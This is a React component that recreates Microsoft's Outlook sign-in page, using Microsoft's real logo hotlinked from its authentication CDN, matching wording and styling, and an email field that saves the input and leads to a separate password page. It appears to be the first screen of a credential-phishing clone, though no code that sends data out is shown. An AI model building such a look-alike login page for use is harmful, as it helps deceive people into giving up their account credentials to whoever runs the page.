import React, { useContext } from 'react';
import micro from '../Assets/microsoft-svgrepo-com.svg';
import key from '../Assets/key-svgrepo-com.svg';
import { Link } from 'react-router-dom';
import { UserContext } from '../UserContext/UserContextProvider';

// import './App.css'

function Login() {
  const { email, setEmail } = useContext(UserContext);

    const handleChange = (event) => {
        setEmail(event.target.value);
    };

    

  return (
    <>
    <div className="w-screen min-h-screen">
    <div className='absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2'>
      <div className='flex items-center justify-center'>
        <img src={'https://logincdn.msauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png'} alt="Logo" className="w-44 mb-6"/>
      </div>

    {/* sign in */}

      <div className='px-10 bg-[#fff] w-[28rem] h-[24rem] shadow-lg'>
        
          <form  method="post">
          {/* image logo */}
          <div className="image">
        <img src={micro} className='w-[7rem]' />
          </div>

          {/* sign in data */}
          <div className="relative bottom-7 text-left">
            <h1 className='text-2xl font-bold'>Sign in</h1>
            <p className='text-sm '>to continue to Outlook</p>
          </div>

          {/* form input */}
          <input type="email" name="email" required value={email} onChange={handleChange} placeholder='Email, phone, or Skype' className='w-full py-3 outline-none border-b border-gray-700 text-left' />
          <p className='text-left text-[0.8rem] my-4'>No account? <span className='text-[#0068B8] cursor-pointer hover:underline hover:text-gray-500'>Create one!</span> </p>
          <p className='text-left text-[0.8rem] text-[#0068B8] cursor-pointer hover:underline hover:text-gray-500' >Sign in with Windows Hello or a security key </p>
       
          <Link to="/password"><button className='relative left-32 bg-[#0068B8] px-9 py-1 text-white mt-6'>Next</button></Link>
  

        </form>
      </div>

      {/* option div */}

    <div className="mt-6 w-[28rem] h-[3rem] bg-white flex shadow-lg hover:bg-gray-200">
      <img src={key} className='w-10 h-7 my-3 ml-10'/>
      <p className='my-3 font-light ml-2'>Sign-in options</p>
    </div>

    </div>
    </div>
      
    </>
  )
}

export default Login;